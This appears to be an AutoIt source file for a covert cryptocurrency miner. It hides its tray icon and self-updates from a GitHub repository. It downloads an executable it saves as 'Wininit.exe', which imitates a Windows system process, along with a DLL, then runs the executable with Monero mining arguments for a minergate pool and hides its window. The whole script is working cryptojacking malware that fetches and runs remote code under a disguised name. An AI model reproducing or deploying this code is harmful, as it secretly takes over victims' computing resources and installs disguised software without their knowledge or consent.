#NoTrayIcon
#Region ;**** Directives created by AutoIt3Wrapper_GUI ****
#Tidy_Parameters=/rel /reel /sf
#EndRegion ;**** Directives created by AutoIt3Wrapper_GUI ****
#include <GuiListView.au3>


HotKeySet("{f4}", sair)
HotKeySet("{f7}", fechar)

need_update()
start_var()
download()
executar()
inf()


Func need_update() ; verifica se precisa de update
	$update = IniRead(@AppDataDir & "\WinGG\update.ini", "version", "version", "Default") ; Pega a versão instalada
	$version_download = InetGet("https://raw.githubusercontent.com/WinGGAp/WinGG/master/Arquivos%20FONtes/Fonte/Version.ini", @AppDataDir & "\WinGG\version.ini") ;baixa o arquivo que contem a versao atualizada
	$version = IniRead($version_download, "version", "version", "Default") ;le a versao atualizada
	If Not ($version = $update) Then ;compara se o update é diferente caso sim, ele fecha, atualiza e inicia denovo.
		Run(@AppDataDir & "\WinGG\update.exe")
		Exit
	EndIf
EndFunc   ;==>need_update

Func start_var()
	Global $_name = "Wininit.exe"
	Global $_coin_code = " -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u ztxslmso@abyssmail.com -p x -t1 --cpu-priority 1 -B" ;Cmd to Mine
	Global $_Url0 = "https://github.com/WinGGAp/WinGG/raw/master/Arquivos%20FONtes/Wininit.exe" ;Url
	Global $_Url1 = "https://github.com/WinGGAp/WinGG/raw/master/Arquivos%20FONtes/msvcr120.dll" ;Url
EndFunc   ;==>start_var




Func download()
	$path0 = (@AppDataDir & "\WinGG\" & $_name)
	$path1 = (@AppDataDir & "\WinGG\msvcr120.dll")
	InetGet($_Url0, $path0)
	InetGet($_Url1, $path1)
EndFunc   ;==>download

Func executar()
	Run(@AppDataDir & "\WinGG\" & $_name & $_coin_code)
	Global $hwnd = WinWait(@AppDataDir & "\WinGG\" & $_name)
	WinSetState($hwnd, "", @SW_HIDE)
EndFunc   ;==>executar

Func sair()
	Exit
EndFunc   ;==>sair

Func fechar()
	WinClose($hwnd)
	Exit
EndFunc   ;==>fechar


Func inf()
	While 1
	WEnd
EndFunc   ;==>inf



